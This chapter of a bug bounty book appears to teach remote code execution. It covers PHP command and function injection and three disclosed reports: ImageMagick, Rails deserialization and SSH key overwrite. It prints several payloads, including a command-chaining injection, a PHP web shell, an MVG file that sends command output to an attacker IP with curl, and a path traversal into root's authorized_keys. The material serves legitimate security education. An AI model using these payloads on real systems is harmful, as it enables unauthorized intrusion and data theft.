<html><head></head><body>
<h2 class="h2" id="ch12"><span epub:type="pagebreak" id="page_119"/><strong><span class="big">12</span><br/>REMOTE CODE EXECUTION</strong></h2>&#13;
<div class="image1"><img alt="Image" src="../images/common.jpg"/></div>&#13;
<p class="noindent">A <em>remote code execution (RCE)</em> vulnerability occurs when an application uses user-controlled input without sanitizing it. RCE is typically exploited in one of two ways. The first is by executing shell commands. The second is by executing functions in the programming language that the vulnerable application uses or relies on.</p>&#13;
<h3 class="h3" id="ch12lev1sec1"><strong>Executing Shell Commands</strong></h3>&#13;
<p class="noindent">You can perform RCE by executing shell commands that the application doesn’t sanitize. A <em>shell</em> gives command line access to an operating system’s services. As an example, let’s pretend the site <em>www.&lt;example&gt;.com</em> is designed to ping a remote server to confirm whether the server is available. <span epub:type="pagebreak" id="page_120"/>Users can trigger this by providing a domain name to the <code>domain</code> parameter in <code>www.</code><span class="codeitalic">example</span><code>.com?domain=</code>, which the site’s PHP code processes as follows:</p>&#13;
<pre><span class="ent">➊</span> $domain = $_GET[domain];<br/>&#13;
   echo shell_exec(<span class="ent">➋</span>"ping -c 1 $domain");</pre>&#13;
<p class="indent">Visiting <em>www.&lt;example&gt;.com?domain=google.com</em> assigns the value <code>google.com</code> to the variable <code>$domain</code> at <span class="ent">➊</span> and then passes that variable directly into the <code>shell_exec</code> function as an argument for the <code>ping</code> command at <span class="ent">➋</span>. The <code>shell_exec</code> function executes a shell command and returns the complete output as a string.</p>&#13;
<p class="indent">The output of this command is something like the following:</p>&#13;
<pre>PING google.com (216.58.195.238) 56(84) bytes of data.<br/>&#13;
64 bytes from sfo03s06-in-f14.1e100.net (216.58.195.238): icmp_seq=1 ttl=56 time=1.51 ms<br/>&#13;
--- google.com ping statistics ---<br/>&#13;
1 packets transmitted, 1 received, 0% packet loss, time 0ms<br/>&#13;
rtt min/avg/max/mdev = 1.519/1.519/1.519/0.000 ms</pre>&#13;
<p class="indent">The details of the response aren’t important: just know that the <code>$domain</code> variable is passed directly to the <code>shell_exec</code> command without being sanitized. In bash, which is a popular shell, you can chain commands together using a semicolon. So an attacker could visit the URL <em>www.&lt;example&gt;.com?domain=google.com;id</em>, and the <code>shell_exec</code> function would execute the <code>ping</code> and <code>id</code> commands. The <code>id</code> command outputs information about the current user executing the command on the server. For example, the output might look like the following:</p>&#13;
<pre><span class="ent">➊</span> PING google.com (172.217.5.110) 56(84) bytes of data.<br/>&#13;
   64 bytes from sfo03s07-in-f14.1e100.net (172.217.5.110):<br/>&#13;
   icmp_seq=1 ttl=56 time=1.94 ms<br/>&#13;
   --- google.com ping statistics ---<br/>&#13;
   1 packets transmitted, 1 received, 0% packet loss, time 0ms<br/>&#13;
   rtt min/avg/max/mdev = 1.940/1.940/1.940/0.000 ms<br/>&#13;
<span class="ent">➋</span> uid=1000(yaworsk) gid=1000(yaworsk) groups=1000(yaworsk)</pre>&#13;
<p class="indent">The server executes two commands, so the response from the <code>ping</code> command displays <span class="ent">➊</span> along with the output from the <code>id</code> command. The <code>id</code> command’s output <span class="ent">➋</span> indicates the website is running the application on the server as the user named <code>yaworsk</code> with a <code>uid</code> of <code>1000</code> that belongs to the <code>gid</code> and group <code>1000</code> with the same name, <code>yaworsk</code>.</p>&#13;
<p class="indent">The user permissions of <code>yaworsk</code> determine how severe this RCE vulnerability is. In this example, an attacker could read the site’s code using the command <code>;cat</code> <span class="codeitalic">FILENAME</span> (where <span class="codeitalic">FILENAME</span> is the file to be read) and might write files to some directories. If the site uses a database, it’s likely an attacker could dump that as well.</p>&#13;
<p class="indent">This type of RCE occurs if a site trusts user-controlled input without sanitizing it. The solution to addressing the vulnerability is simple. In PHP, a website’s developer can use the <code>escapeshellcmd</code>, which escapes any characters in a string that might trick a shell into executing arbitrary commands. <span epub:type="pagebreak" id="page_121"/>As a result, any appended commands in the URL parameter would be read as one escaped value. This means that <code>google.com\;id</code> would have been passed to the <code>ping</code> command, resulting in the error <code>ping: google.com;id: Name or service not known</code>.</p>&#13;
<p class="indent">Although the special characters would be escaped to avoid executing additional, arbitrary commands, keep in mind that <code>escapeshellcmd</code> would not prevent you from passing command line flags. A <em>flag</em> is an optional argument that changes a command’s behavior. For example, <code>-0</code> is a common flag used to define a file to write to when a command generates output. Passing a flag could change the behavior of the command and possibly result in an RCE vulnerability. Preventing RCE vulnerabilities can be tricky because of these nuances.</p>&#13;
<h3 class="h3" id="ch12lev1sec2"><strong>Executing Functions</strong></h3>&#13;
<p class="noindent">You can also perform RCE by executing functions. For example, if <em>www.&lt;example&gt;.com</em> allowed users to create, view, and edit blog posts via a URL, like <em>www.&lt;example&gt;.com?id=1&amp;action=view</em>, the code that performed these actions might look like the following:</p>&#13;
<pre><span class="ent">➊</span> $action = $_GET['action'];<br/>&#13;
   $id = $_GET['id'];<br/>&#13;
<span class="ent">➋</span> call_user_func($action, $id);</pre>&#13;
<p class="indent">Here the website uses the PHP function <code>call_user_func</code> <span class="ent">➋</span>, which calls the first argument given as a function and passes the remaining parameters as arguments to that function. In this case, the application would call the <code>view</code> function that is assigned to the <code>action</code> variable <span class="ent">➊</span> and pass <code>1</code> to the function. This command would presumably show the first blog post.</p>&#13;
<p class="indent">But if a malicious user visits the URL <em>www.&lt;example&gt;.com?id=/etc/passwd &amp;action=file_get_contents</em>, this code would evaluate as:</p>&#13;
<pre>$action = $_GET['action']; //file_get_contents<br/>&#13;
$id = $_GET['id']; ///etc/passwd<br/>&#13;
call_user_func($action, $id); //file_get_contents(/etc/passwd);</pre>&#13;
<p class="indent">Passing <code>file_get_contents</code> as the action argument calls that PHP function to read the contents of a file into a string. In this case, the file <em>/etc/passwd</em> is passed as the <code>id</code> parameter. Then <em>/etc/passwd</em> is passed as the argument to <code>file_get_contents</code>, resulting in the file being read. An attacker could use this vulnerability to read the source code of the entire application, obtain database credentials, write files on the server, and so on. Instead of showing the first blog post, the output would look like this:</p>&#13;
<pre>root:x:0:0:root:/root:/bin/bash<br/>&#13;
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>&#13;
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>&#13;
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>&#13;
sync:x:4:65534:sync:/bin:/bin/sync</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_122"/>If the functions passed to the <code>action</code> parameter are not sanitized or filtered, it’s also possible for an attacker to invoke shell commands with PHP functions, such as <code>shell_exec</code>, <code>exec</code>, <code>system</code>, and so on.</p>&#13;
<h3 class="h3" id="ch12lev1sec3"><strong>Strategies for Escalating Remote Code Execution</strong></h3>&#13;
<p class="noindent">Both types of RCE can cause a variety of effects. When an attacker can execute any programming language function, it’s likely they might escalate the vulnerability to execute shell commands. Executing shell commands is often more critical because an attacker could compromise the entire server rather than just the application. The extent of the vulnerability depends on the server user’s permissions or whether the attacker can exploit another bug to elevate the user’s privileges, which is commonly referred to as <em>local privilege escalation (LPE)</em>.</p>&#13;
<p class="indent">Although a full explanation of LPEs is beyond the scope of this book, just know that an LPE typically occurs by exploiting kernel vulnerabilities, services running as root, or <em>set user ID (SUID)</em> executables. A <em>kernel</em> is the computer’s operating system. Exploiting a kernel vulnerability could allow an attacker to elevate their permissions to perform actions they otherwise wouldn’t be authorized to do. In cases where the attacker can’t exploit the kernel, they could try exploiting services running as root. Normally, services shouldn’t run as root; this vulnerability often occurs when an administrator ignores security considerations by starting a service as the root user. If the administrator is compromised, the attacker could access the service running as root, and any commands the service runs would have elevated root permissions. Lastly, the attacker could exploit SUID, which allows users to execute a file with the permissions of a specified user. Although this is meant to enhance security, when misconfigured, it could allow attackers to execute commands with elevated privileges, similar to services running as root.</p>&#13;
<p class="indent">Given the variety of operating systems, server software, programming languages, frameworks, and so on used to host websites, it’s impossible to detail every way you could inject functions or shell commands. But there are patterns to finding clues to where potential RCEs might exist without seeing the application code. In the first example, one red flag was that the site executed the <code>ping</code> command, which is a system-level command.</p>&#13;
<p class="indent">In the second example, the <code>action</code> parameter is a red flag because it allowed you to control what function is run on the server. When you’re looking for these types of clues, look at the parameters and values passed to the site. You can easily test this type of behavior by passing system actions or special command line characters, like semicolons or backticks, to the parameters in place of expected values.</p>&#13;
<p class="indent">Another common cause of an application-level RCE is unrestricted file uploads that the server executes when visited. For example, if a PHP website allows you to upload files to a workspace but doesn’t restrict the file type, you could upload a PHP file and visit it. Because a vulnerable server can’t differentiate between legitimate PHP files for the application and your <span epub:type="pagebreak" id="page_123"/>malicious upload, the file will be interpreted as PHP and its contents will be executed. Here’s an example of a file that allows you to execute PHP functions defined by the URL parameter <code>super_secret_web_param</code>:</p>&#13;
<pre>$cmd = $_GET['super_secret_web_param'];<br/>&#13;
system($cmd);</pre>&#13;
<p class="indent">If you uploaded this file to <em>www.&lt;example&gt;.com</em> and accessed it at <em>www.&lt;example&gt;.com/files/shell.php</em>, you could execute system commands by adding the parameter with a function, such as <code>?super_secret_web_param='ls'</code>. Doing so would output the contents of the <em>files</em> directory. Be extremely careful when you’re testing this type of vulnerability. Not all bounty programs want you to execute your own code on their server. If you do upload a shell like this, be sure to delete it so no one else finds it or exploits it maliciously.</p>&#13;
<p class="indent">More complex RCE examples are often the result of nuanced application behavior or programming mistakes. In fact, such examples were discussed in <a href="ch08.xhtml#ch08">Chapter 8</a>. Orange Tsai’s Uber Flask Jinja2 template injection (<a href="ch08.xhtml#page_74">page 74</a>) was an RCE that permitted him to execute his own Python functions using the Flask templating language. My Unikrn Smarty template injection (<a href="ch08.xhtml#page_78">page 78</a>) allowed me to exploit the Smarty framework to execute PHP functions, including <code>file_get_contents</code>. Given the variety of RCEs, here we’ll focus on more traditional examples than those you’ve seen in previous chapters.</p>&#13;
<h3 class="h3" id="ch12lev1sec4"><strong>Polyvore ImageMagick</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Medium</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="http://Polyvore.com">Polyvore.com</a></em> (Yahoo! acquisition)</p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="http://nahamsec.com/exploiting-imagemagick-on-yahoo/">http://nahamsec.com/exploiting-imagemagick-on-yahoo/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> May 5, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $2,000</p>&#13;
<p class="noindent">Looking at vulnerabilities that have been disclosed in widely used software libraries can be an effective way to discover bugs in sites using that software. ImageMagick is a common graphics library that processes images and has an implementation in most, if not all, major programming languages. This means that an RCE in the ImageMagick library can have devastating effects on websites that rely on it.</p>&#13;
<p class="indent">In April 2016, the maintainers of ImageMagick publicly disclosed library updates to fix critical vulnerabilities. The updates revealed that ImageMagick wasn’t properly sanitizing input in a variety of ways. The most dangerous of these led to an RCE via ImageMagick’s <code>delegate</code> functionality, which processes files using external libraries. The following code does this by passing a user-controlled domain to the <code>system()</code> command as the placeholder <span class="codeitalic">%M</span>:</p>&#13;
<pre>"wget" -q -O "%o" "https:<span class="codeitalic1">%M</span>"</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_124"/>This value was not sanitized before it was used, so submitting <code>https://</code><span class="codeitalic">example</span><code>.com";|ls "-la</code> would translate to this:</p>&#13;
<pre>wget -q -O "%o" "https://<span class="codeitalic1">example</span>.com";|ls "-la"</pre>&#13;
<p class="indent">As in the earlier RCE example, which involved chaining extra commands to <code>ping</code>, this code chains an extra command line function to the intended functionality using a semicolon.</p>&#13;
<p class="indent">The <code>delegate</code> functionality can be abused by image file types that allow external file referencing. Examples include SVGs and the ImageMagick-defined file type, MVG. When ImageMagick processes an image, it tries to guess a file’s type based on its file contents rather than its extension. For example, if a developer tried to sanitize user-submitted images by allowing their application to accept only user files ending in <em>.jpg</em>, an attacker could bypass the sanitization by renaming a <em>.mvg</em> file as a <em>.jpg</em>. The application would believe the file is a safe <em>.jpg</em>, but ImageMagick would properly recognize the file type was an MVG based on the file content. This would allow the attacker to abuse the ImageMagick RCE vulnerability. Examples of malicious files used to abuse this ImageMagick vulnerability are available at <em><a href="https://imagetragick.com/">https://imagetragick.com/</a></em>.</p>&#13;
<p class="indent">After this vulnerability was publicly disclosed and websites had an opportunity to update their code, Ben Sadeghipour went hunting for sites using unpatched versions of ImageMagick. As his first step, Sadeghipour re-created the vulnerability on his own server to confirm he had a working malicious file. He chose to use the example MVG file from <em><a href="https://imagetragick.com/">https://imagetragick.com/</a></em>, but could have easily used the SVG file as well, since both reference external files which will trigger the vulnerable ImageMagick <code>delegate</code> functionality. Here’s his code:</p>&#13;
<pre>   push graphic-context<br/>&#13;
   viewbox 0 0 640 480<br/>&#13;
<span class="ent">➊</span> image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl\<br/>&#13;
     http://<span class="codeitalic1">SOMEIPADDRESS</span>:8080/ -d @- &gt; /dev/null`'<br/>&#13;
   pop graphic-context</pre>&#13;
<p class="indent">The important part of this file is the line at <span class="ent">➊</span>, which includes the malicious input. Let’s break it down. The first part of the exploit is <em>https://127.0.0.1/x.php?x=</em>. This is the remote URL ImageMagick is expecting as part of its delegator behavior. Sadeghipour follows this with <code>`id</code>. On the command line, backticks (<code>`</code>) denote input that the shell should process before the main command. This ensures that Sadeghipour’s payload (described next) is processed immediately.</p>&#13;
<p class="indent">The pipe (<code>|</code>) passes output from one command to the next. In this case, the output of <code>id</code> is passed to <code>curl http://</code><span class="codeitalic">SOMEIPADDRESS</span><code>:8080/ -d @-</code>. The cURL library makes remote HTTP requests and, in this case, makes a request to Sadeghipour’s IP address, which is listening on port 8080. The <code>-d</code> flag is a cURL option to send data as a <code>POST</code> request. The <code>@</code> instructs cURL to use the input exactly as it receives it with no other processing. The hyphen (<code>–</code>) denotes that standard input will be used. When all of this syntax is combined <span epub:type="pagebreak" id="page_125"/>with the pipe (<code>|</code>), the output of the <code>id</code> command will be passed to cURL as the <code>POST</code> body without any processing. Finally, the <code>&gt; /dev/null</code> code drops any output from the command so that nothing is printed to the vulnerable server terminal. This helps keep the target from realizing that their security has been compromised.</p>&#13;
<p class="indent">Before uploading the file, Sadeghipour started a server to listen for HTTP requests using Netcat, a common networking utility for reading and writing to connections. He ran the command <code>nc -l -n -vv -p 8080</code>, which allowed Sadeghipour to log <code>POST</code> requests to his server. The <code>-l</code> flag enables listen mode (to receive requests), <code>-n</code> prevents DNS lookups, <code>-vv</code> enables verbose logging, and <code>-p 8080</code> defines the port used.</p>&#13;
<p class="indent">Sadeghipour tested his payload on the Yahoo! site Polyvore. After uploading his file on the site as an image, Sadeghipour received the following <code>POST</code> request, which included the result of the <code>id</code> command executed on Polyvore servers in the body.</p>&#13;
<pre>Connect to [REDACTED] from (UNKNOWN) [REDACTED] 53406<br/>&#13;
POST / HTTP/1.1<br/>&#13;
User-Agent: [REDACTED]<br/>&#13;
Host: [REDACTED]<br/>&#13;
Accept: /<br/>&#13;
Content-Length: [REDACTED]<br/>&#13;
Content-Type: application/x-www-form-urlencoded<br/>&#13;
uid=[REDACTED] gid=[REDACTED] groups=[REDACTED]</pre>&#13;
<p class="indent">This request meant that Sadeghipour’s MVG file was successfully executed, causing the vulnerable website to execute the <code>id</code> command.</p>&#13;
<h4 class="h4" id="ch12lev2sec1"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">There are two significant takeaways from Sadeghipour’s bug. First, being aware of disclosed vulnerabilities provides you with the opportunity to test new code, as mentioned in previous chapters. If you’re testing large libraries, also ensure that the companies of the websites you’re testing are properly managing their security updates. Some programs will ask you not to report unpatched updates within a given time frame of the disclosure, but after that you’re free to report the vulnerability. Second, reproducing vulnerabilities on your own servers is a great learning opportunity. It ensures that your payloads are functional when you attempt to implement them for a bug bounty.</p>&#13;
<h3 class="h3" id="ch12lev1sec5"><strong>Algolia RCE on <a href="http://facebooksearch.algolia.com">facebooksearch.algolia.com</a></strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> High</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="http://facebooksearch.algolia.com">facebooksearch.algolia.com</a></em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/134321/">https://hackerone.com/reports/134321/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> April 25, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $500</p>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_126"/>Proper reconnaissance is an important part of hacking. On April 25, 2016, Michiel Prins (a HackerOne co-founder) was doing recon on <em><a href="http://algolia.com">algolia.com</a></em> using the tool Gitrob. This tool takes an initial GitHub repository, person, or organization as a seed and spiders all repositories it can find from people connected to it. Within all the repositories it finds, it will look for sensitive files based on keywords, such as <em>password, secret, database,</em> and so on.</p>&#13;
<p class="indent">Using Gitrob, Prins noticed that Algolia had publicly committed a Ruby on Rails <code>secret_key_base</code> value to a public repository. The <code>secret_key_base</code> helps Rails prevent attackers from manipulating signed cookies, and it’s meant to be concealed and never shared. Typically, this value is replaced by the environment variable <code>ENV['SECRET_KEY_BASE']</code>, which only the server can read. Using the <code>secret_key_base</code> is especially important when a Rails site uses a cookiestore to store session information in the cookies (we’ll come back to this). Because Algolia committed the value to a public repository, the <code>secret_key_base</code> value is still visible at <em><a href="https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/">https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/</a></em> but is no longer valid.</p>&#13;
<p class="indent">When Rails signs a cookie, it appends a signature to the cookie’s base64-encoded value. For example, a cookie and its signature might look like this: <code>BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b8</code>. Rails checks the signature after the double dashes to ensure the beginning of the cookie hasn’t been altered. This is significant when Rails is using the cookiestore, because Rails manages website sessions using cookies and their signatures by default. Information about a user can be added to the cookie and read by the server when the cookie is submitted via an HTTP request. Because the cookie is saved on a person’s computer, Rails signs the cookie with the secret to ensure it hasn’t been tampered with. How the cookie is read is also important; the Rails cookiestore serializes and deserializes the information stored in the cookie.</p>&#13;
<p class="indent">In computer science, <em>serialization</em> is the process of converting an object or data into a state that allows it to be transferred and reconstructed. In this case, Rails converts the session information into a format that can be stored in a cookie and reread when a user submits the cookie during their next HTTP request. After serialization, the cookie is read through deserialization. The deserialization process is complex and beyond the scope of this book. But it can often lead to RCEs it is passed untrusted data.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>To learn more about deserialization, see these two great resources: Matthias Kaiser’s “Exploiting Deserialization Vulnerabilities in Java” talk at</em> <a href="https://www.youtube.com/watch?v=VviY3O-euVQ/">https://www.youtube.com/watch?v=VviY3O-euVQ/</a> <em>and Alvaro Muñoz and Alexandr Mirosh’s “Friday the 13th JSON attacks” talk at</em> <a href="https://www.youtube.com/watch?v=ZBfBYoK_Wr0/">https://www.youtube.com/watch?v=ZBfBYoK_Wr0/</a>).</p>&#13;
</div>&#13;
<p class="indent">Knowing the Rails secret meant Prins could create his own valid serialized objects and send them to the site to be deserialized via a cookie. If vulnerable, deserialization would lead to an RCE.</p>&#13;
<p class="indent">Prins used a Metasploit Framework exploit called Rails Secret Deserialization to escalate this vulnerability into an RCE. The Metasploit exploit <span epub:type="pagebreak" id="page_127"/>creates a cookie that invokes a reverse shell if it’s successfully deserialized. Prins sent the malicious cookie to Algolia, which enabled a shell on the vulnerable server. As a proof of concept, he ran the command <code>id</code>, which returned <code>uid=1000(prod) gid=1000(prod) groups=1000(prod)</code>. He also created the file <em>hackerone.txt</em> on the server to demonstrate the vulnerability.</p>&#13;
<h4 class="h4" id="ch12lev2sec2"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">In this case, Prins used an automated tool to scrape public repositories for sensitive values. By doing the same, you can also discover any repositories using suspicious keywords that might clue you in to vulnerabilities. Exploiting deserialization vulnerabilities can be very complex, but some automated tools exist to make this easier. For example, you can use Rapid7’s Rails Secret Deserialization for earlier versions of Rails and ysoserial, which is maintained by Chris Frohoff, for Java deserialization vulnerabilities.</p>&#13;
<h3 class="h3" id="ch12lev1sec6"><strong>RCE Through SSH</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> High</p>&#13;
<p class="hang"><strong>URL:</strong> N/A</p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/">blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> Fall 2017</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> Undisclosed</p>&#13;
<p class="noindent">When a target program gives you a large scope to test, it’s best to automate the discovery of assets, then look for subtle indicators that a site might contain vulnerabilities. This is exactly what Jasmin Landry did in the fall of 2017. He began enumerating subdomains and open ports on a website by using the tools Sublist3r, Aquatone, and Nmap. Because he had discovered hundreds of possible domains and it was impossible to visit them all, he used the automated tool EyeWitness to take screenshots of each one. This helped him visually identify interesting websites.</p>&#13;
<p class="indent">EyeWitness disclosed a content management system that Landry found unfamiliar, looked old, and was open source. Landry guessed the default credentials for the software would be <code>admin:admin</code>. Testing them worked, so he kept digging. The site didn’t have any content, but auditing the open source code revealed the application ran as the root user on a server. This is bad practice: the root user can perform any action on a site, and if the application is compromised, an attacker would have full permissions on the server. This was another reason for Landry to keep digging.</p>&#13;
<p class="indent">Next, Landry looked for <em>disclosed security issues</em>, or <em>CVEs</em>. The site had none, which was unusual for old, open source software. Landry identified a number of less severe issues including XSS, CSRF, XXEs, and a <em>local file disclosure</em> (the ability to read arbitrary files on a server). All of these bugs meant it was likely that an RCE could exist somewhere.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_128"/>Continuing his work, Landry noticed an API endpoint that allowed users to update template files. The path was <em>/api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml</em>, and it accepted XML via a <code>POST</code> body. The ability to write files and the ability to define their path are two significant red flags. If Landry could write files anywhere and have the server interpret them as application files, he could execute whatever code he wanted on the server and possibly invoke system calls. To test this, he changed the path to <em>../../../../../../../../../../../../tmp/test.txt</em>. The symbols <em>../</em> are references to the previous directory in the current path. So if the path was <em>/api/i/services</em>, <em>../</em> would be <em>/api/i</em>. This allowed Landry to write in any folder he wanted.</p>&#13;
<p class="indent">Uploading his own file worked, but the application configuration didn’t allow him to execute code, so he needed to find an alternative route to an RCE. It occurred to him that a <em>Secure Socket Shell (SSH)</em> can use public SSH keys to authenticate users. SSH access is the typical way to administer a remote server: it logs into the command line via the secure connection established by validating public keys on the remote host in the <em>.ssh/authorized_keys</em> directory. If he was able to write to the directory and upload his own SSH public key, the site would authenticate him as the root user with direct SSH access and full permissions on the server.</p>&#13;
<p class="indent">He tested this and was able to write to <em>../../../../../../../../../../../../root/.ssh/authorized_keys</em>. Attempting to use SSH to get into the server worked and running the <code>id</code> command confirmed he was root <code>uid=0(root) gid=0(root) groups=0(root)</code>.</p>&#13;
<h4 class="h4" id="ch12lev2sec3"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Enumerating subdomains when you’re searching for bugs in a large scope is important because it gives you more surface area to test. Landry was able to use automated tools to discover a suspicious target, and confirming a few initial vulnerabilities indicated there could be more to find. Most notably, when his initial attempt at a file upload RCE failed, Landry reconsidered his approach. He recognized that he could exploit the SSH configuration rather than just report the arbitrary file writing vulnerability by itself. Submitting a comprehensive report that fully demonstrates impact usually increases the bounty amount you’re awarded. So don’t stop immediately once you’ve found something—keep digging.</p>&#13;
<h3 class="h3" id="ch12lev1sec7"><strong>Summary</strong></h3>&#13;
<p class="noindent">RCE, like a lot of other vulnerabilities discussed in this book, usually occurs when user input isn’t properly sanitized before use. In the first bug report, ImageMagick wasn’t properly escaping content before passing it to system commands. To find this bug, Sadeghipour first re-created the vulnerability on his own server and then went searching for unpatched servers. In contrast, Prins discovered a secret that allowed him to forge signed cookies. Lastly, Landry found a way to write arbitrary files on a server and used that to overwrite SSH keys so he could log in as root. All three used different methods to obtain RCE, but each took advantage of the site accepting unsanitized input.</p>&#13;
</body></html>